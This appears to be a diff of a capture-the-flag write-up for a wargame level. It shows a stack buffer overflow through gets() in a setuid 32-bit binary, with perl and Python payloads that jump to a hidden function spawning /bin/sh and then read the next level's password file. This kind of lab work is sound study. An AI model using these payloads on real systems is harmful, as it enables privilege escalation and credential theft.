@@ -1,131 +1,32 @@
 ## Level1 - Buffer Overflow to Hidden run() Function
+Hidden run() at 0x08048444 calls system("/bin/sh"). Exploit overwrites return address via buffer overflow in gets().
 
-### Solution Summary
-The binary contains a **hidden `run()` function** that wasn't called from main().
-This function calls `system("/bin/sh")` which spawns a shell with proper privileges.
-The exploit simply overwrites the return address to jump to this hidden function.
-
-### Extract Binary from VM
-```bash
-scp -P 4242 level1@localhost:/home/user/level1/level1 ./level1
-```
-
-### Vulnerability Analysis
+### Vulnerability
 - **Binary**: level1 (32-bit ELF, setuid level2)
-- **Vulnerability**: Stack buffer overflow in main() via gets()
-- **Protection**: NX disabled, ASLR disabled
+- **Flaw**: gets() buffer overflow with no bounds checking
+- **Protections**: NX disabled, ASLR disabled
 
-### Binary Disassembly
-
-**Main function:**
-```
-08048480 <main>:
- 8048480:  push   %ebp
- 8048481:  mov    %esp,%ebp
- 8048483:  and    $0xfffffff0,%esp
- 8048486:  sub    $0x50,%esp          # Allocate 80 bytes on stack
- 8048489:  lea    0x10(%esp),%eax     # Buffer at ESP+0x10 (16 bytes offset)
- 804848d:  mov    %eax,(%esp)
- 8048490:  call   8048340 <gets@plt>  # Vulnerable gets() call - NO BOUNDS CHECKING
- 8048495:  leave
- 8048496:  ret                        # We will overwrite this return address
-```
-
-**Hidden run() function:**
-```
-08048444 <run>:
- 8048444:  push   %ebp
- 8048445:  mov    %esp,%ebp
- 8048447:  sub    $0x18,%esp
- 804844a:  mov    0x80497c0,%eax
- 804844f:  mov    %eax,%edx
- 8048451:  mov    $0x8048570,%eax
- 8048456:  mov    %edx,0xc(%esp)
- 804845a:  movl   $0x13,0x8(%esp)
- 8048462:  movl   $0x1,0x4(%esp)
- 804846a:  mov    %eax,(%esp)
- 804846d:  call   8048350 <fwrite@plt>   # Prints "Good... Wait what?\n"
- 8048472:  movl   $0x8048584,(%esp)      # Address of "/bin/sh" string
- 8048479:  call   8048360 <system@plt>   # Calls system("/bin/sh")
- 804847e:  leave
- 804847f:  ret
-```
-
-### Key Findings
-- Hidden run() function at: **0x08048444**
-- Buffer size: 64 bytes (from ESP+0x10 to ESP+0x4F)
-- Padding needed: 76 bytes (64 for buffer + alignment/saved EBP)
-- The string "/bin/sh" is at 0x8048584 in the binary's .rodata section
+### Key Addresses
+- Hidden run(): 0x08048444 → calls system("/bin/sh")
+- Buffer size: 64 bytes, padding needed: 76 bytes (64 + alignment)
 
 ### Exploit Strategy
-1. Fill buffer with 76 bytes of padding
-2. Overwrite return address with 0x08048444 (address of run())
-3. When main() returns, it jumps to run()
-4. run() calls system("/bin/sh") with setuid privileges preserved
-
-### Exploit Code (Python3)
-```python
-import struct
-
-RUN_FUNCTION = 0x08048444
-
-padding = b"A" * 76
-payload = padding + struct.pack("<I", RUN_FUNCTION)
-
-with open('/tmp/payload', 'wb') as f:
-    f.write(payload)
-```
-
-Or use the provided exploit:
+Fill buffer with 76 bytes of padding, overwrite return address with 0x08048444.
 ```bash
-python3 Resources/exploit.py > /tmp/payload
+perl -e 'print "A" x 76 . "\x44\x84\x04\x08\n"' | ./level1
 ```
 
-### Execution on VM
+### Execution
 ```bash
-# SSH into the VM as level1
-ssh level1@<VM_IP> -p 4242
-
-# Create and run the exploit
-(python3 << 'EOF'
-import struct
-print("A" * 76 + struct.pack("<I", 0x08048444), end='')
-EOF
-cat) | ./level1
-
-# You should see:
-# Good... Wait what?
-# $
-
-# Now you have a shell as level2! Get the password:
-$ cat /home/user/level2/.pass
-$ exit
+ssh level1@localhost -p 4242
+(perl -e 'print "A" x 76 . "\x44\x84\x04\x08\n"'; echo "cat /home/user/level2/.pass"; sleep 1) | ./level1
 ```
 
-### Verification Steps
+### Why It Works
+gets() overflows buffer, overwrites return address. main() returns to run() instead, calling system("/bin/sh") with level2 privileges.
+
+### Verify
 ```bash
-# 1. Find the hidden function
-objdump -d ./level1 | grep "^[0-9a-f]* <.*>:"
-
-# 2. Verify run() calls system
-objdump -d ./level1 | grep -A 10 "^08048444 <run>:"
-
-# 3. Find the /bin/sh string
-strings ./level1 | grep "/bin/sh"
-
-# 4. Test exploit locally
-python3 Resources/exploit.py > /tmp/payload
-(cat /tmp/payload; cat) | ./level1
+objdump -d ./level1 | grep "<run>:" # Find run() function
+strings ./level1 | grep "/bin/sh"  # Find /bin/sh string
 ```
-
-### Why This Works
-- The run() function is compiled into the binary but never called from main()
-- By overflowing the buffer, we overwrite main's return address
-- When main() executes `ret`, it jumps to run() instead of returning normally
-- run() calls system("/bin/sh") which spawns a shell with level2 privileges
-- The setuid bit on the binary ensures the shell runs as level2
-
-### Resources
-- [Buffer Overflow Basics](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation)
-- objdump manual: `man objdump`
-- gets() vulnerability: `man gets` (deprecated function, never use in real code)
